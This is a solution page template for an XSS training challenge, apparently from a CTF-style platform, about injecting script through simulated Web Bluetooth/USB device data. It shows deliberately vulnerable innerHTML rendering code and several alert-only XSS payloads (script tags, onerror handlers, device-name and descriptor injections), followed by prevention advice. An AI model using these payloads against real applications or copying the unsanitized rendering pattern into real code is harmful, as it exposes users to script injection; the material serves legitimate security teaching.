@@ -1,0 +1,241 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 21 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 21 Solution: XSS via Web Bluetooth/USB</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates how Web Bluetooth/USB applications can be vulnerable to XSS attacks if they don't properly sanitize device data before displaying it. The DeviceConnect application allows users to connect to simulated IoT devices and view their data, but has a vulnerability in how it renders device information.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to exploit the vulnerable device data rendering mechanism by injecting JavaScript code that will be executed when the device data is displayed.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>The vulnerability lies in how the application renders device data. Looking at the code, we can see that it directly inserts device data into the DOM without proper sanitization:</p>
+                        <pre class="bg-light p-3 rounded"><code>// Display device data (vulnerable to XSS)
+function displayDeviceData(device) {
+    // This is the vulnerable part - it doesn't properly sanitize the device data
+    // before rendering it in the DOM
+    
+    let dataHTML = `
+        &lt;div class="card"&gt;
+            &lt;div class="card-header bg-light"&gt;
+                &lt;h6 class="mb-0"&gt;Raw Device Data&lt;/h6&gt;
+            &lt;/div&gt;
+            &lt;div class="card-body"&gt;
+                &lt;pre class="mb-0"&gt;${JSON.stringify(device.data, null, 2)}&lt;/pre&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    `;
+    
+    // Render data visualization based on device type
+    if (device.type === 'bluetooth') {
+        dataHTML += `
+            &lt;div class="card mt-3"&gt;
+                &lt;div class="card-header bg-light"&gt;
+                    &lt;h6 class="mb-0"&gt;Data Visualization&lt;/h6&gt;
+                &lt;/div&gt;
+                &lt;div class="card-body"&gt;
+                    &lt;div class="row"&gt;
+        `;
+        
+        // Render different visualizations based on device data
+        // This is also vulnerable to XSS because it directly inserts device data
+        // without proper sanitization
+        if (device.data.temperature !== undefined) {
+            dataHTML += `
+                        &lt;div class="col-md-6 mb-3"&gt;
+                            &lt;div class="card"&gt;
+                                &lt;div class="card-body text-center"&gt;
+                                    &lt;h5 class="mb-3"&gt;Temperature&lt;/h5&gt;
+                                    &lt;div class="display-4"&gt;${device.data.temperature}°C&lt;/div&gt;
+                                &lt;/div&gt;
+                            &lt;/div&gt;
+                        &lt;/div&gt;
+            `;
+        }
+        
+        // ... more visualizations ...
+    }
+    
+    deviceDataContent.innerHTML = dataHTML;
+}</code></pre>
+                        <p>This means that any HTML or JavaScript in the device data will be executed when the data is rendered. The application also provides a device simulator that allows users to create custom devices with arbitrary data, which can be used to inject malicious code.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Crafting the Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit this vulnerability, we need to craft a payload that will be included in the device data and executed when the data is rendered. Here are several approaches:</p>
+                        
+                        <h6>Method 1: Injecting Script via Temperature Field</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "temperature": "&lt;script&gt;alert('XSS Level 21 Completed!')&lt;/script&gt;",
+  "humidity": 60
+}</code></pre>
+                        <p>This payload injects a script tag into the temperature field, which will be executed when the temperature visualization is rendered.</p>
+                        
+                        <h6>Method 2: Injecting Event Handler via Humidity Field</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "temperature": 25,
+  "humidity": "&lt;img src='x' onerror='alert(\"XSS Level 21 Completed!\")'&gt;"
+}</code></pre>
+                        <p>This payload injects an image with an invalid source into the humidity field, triggering the onerror event handler which executes our JavaScript.</p>
+                        
+                        <h6>Method 3: Breaking Out of JSON Stringification</h6>
+                        <pre class="bg-light p-3 rounded"><code>{
+  "temperature": 25,
+  "humidity": 60,
+  "__proto__": {
+    "toString": "function() { alert('XSS Level 21 Completed!'); return ''; }"
+  }
+}</code></pre>
+                        <p>This payload attempts to exploit prototype pollution to override the toString method, which might be called during JSON stringification.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step-by-Step Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>
+                                <p>Open the DeviceConnect application and locate the "Device Simulator" section on the left side of the page.</p>
+                            </li>
+                            <li>
+                                <p>Enter a name for your simulated device (e.g., "Malicious Device").</p>
+                            </li>
+                            <li>
+                                <p>Select a device type (e.g., "Bluetooth").</p>
+                            </li>
+                            <li>
+                                <p>In the "Device Data (JSON)" textarea, enter one of the XSS payloads:</p>
+                                <pre class="bg-light p-3 rounded"><code>{
+  "temperature": "&lt;script&gt;alert('XSS Level 21 Completed!')&lt;/script&gt;",
+  "humidity": 60
+}</code></pre>
+                            </li>
+                            <li>
+                                <p>Click the "Create Simulated Device" button to create the device with the XSS payload.</p>
+                            </li>
+                            <li>
+                                <p>Click the "Scan for Devices" button to find your simulated device in the list.</p>
+                            </li>
+                            <li>
+                                <p>Click the "Connect" button next to your simulated device to connect to it.</p>
+                            </li>
+                            <li>
+                                <p>When the device data is rendered, the XSS payload will be executed, displaying the alert message "XSS Level 21 Completed!".</p>
+                            </li>
+                            <li>
+                                <p>When the alert appears, the challenge will be solved and the flag will be revealed.</p>
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Web Bluetooth/USB-Specific Exploitation Techniques</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>In a real Web Bluetooth/USB application, there are additional exploitation techniques that could be used:</p>
+                        
+                        <h6>1. Device Name Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>// Malicious device advertising with XSS payload in name
+{
+  name: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+  serviceUUIDs: ["0x1234"]
+}</code></pre>
+                        <p>This technique involves creating a Bluetooth device with a malicious name that contains an XSS payload. When the device is discovered and its name is displayed without proper sanitization, the XSS payload is executed.</p>
+                        
+                        <h6>2. Service Data Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>// Malicious service data with XSS payload
+{
+  serviceData: {
+    "0x1234": new TextEncoder().encode("&lt;img src=x onerror=alert('XSS')&gt;")
+  }
+}</code></pre>
+                        <p>This technique involves injecting an XSS payload into the service data of a Bluetooth device. When the service data is displayed without proper sanitization, the XSS payload is executed.</p>
+                        
+                        <h6>3. Descriptor Value Injection</h6>
+                        <pre class="bg-light p-3 rounded"><code>// Reading a characteristic with malicious descriptor value
+await characteristic.getDescriptor('user_description').then(descriptor => {
+  return descriptor.readValue();
+}).then(value => {
+  // Value contains XSS payload: &lt;script&gt;alert('XSS')&lt;/script&gt;
+  document.getElementById('descriptor-value').innerHTML = value;
+});</code></pre>
+                        <p>This technique involves injecting an XSS payload into a characteristic descriptor value. When the descriptor value is read and displayed without proper sanitization, the XSS payload is executed.</p>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Unsafe Content Rendering:</strong> The application renders device data without sanitization, allowing XSS attacks.</li>
+                            <li><strong>Trust in Device Data:</strong> The application trusts data received from devices, which can be manipulated by an attacker.</li>
+                            <li><strong>Insufficient Input Validation:</strong> The application doesn't properly validate device data before processing it.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Content Sanitization:</strong> Always sanitize device data before rendering it in the DOM. Use libraries like DOMPurify to remove potentially malicious content.</li>
+                            <li><strong>Safe DOM Manipulation:</strong> Use <code>textContent</code> instead of <code>innerHTML</code> when rendering device data, or use a framework that automatically escapes HTML.</li>
+                            <li><strong>Input Validation:</strong> Validate all device data to ensure it conforms to expected formats and doesn't contain malicious code.</li>
+                            <li><strong>Web Bluetooth/USB-Specific Protections:</strong>
+                                <ul>
+                                    <li>Validate device names and identifiers before displaying them</li>
+                                    <li>Sanitize all data received from devices before processing it</li>
+                                    <li>Implement proper authentication and authorization for device connections</li>
+                                    <li>Consider using a whitelist of allowed devices</li>
+                                    <li>Limit the permissions requested from the Web Bluetooth/USB API</li>
+                                </ul>
+                            </li>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to mitigate the impact of XSS vulnerabilities.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            Web Bluetooth and Web USB are increasingly used for IoT device management, healthcare applications, and other critical systems. In real-world scenarios, XSS vulnerabilities in Web Bluetooth/USB applications can be particularly dangerous because:
+                        </p>
+                        <ul>
+                            <li>They can provide unauthorized access to physical devices in the user's environment</li>
+                            <li>They can be used to exfiltrate sensitive data from connected devices</li>
+                            <li>They can compromise the security of IoT ecosystems</li>
+                            <li>They can lead to physical security breaches in some cases</li>
+                            <li>Users may not expect web applications to have access to their hardware devices</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level21') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
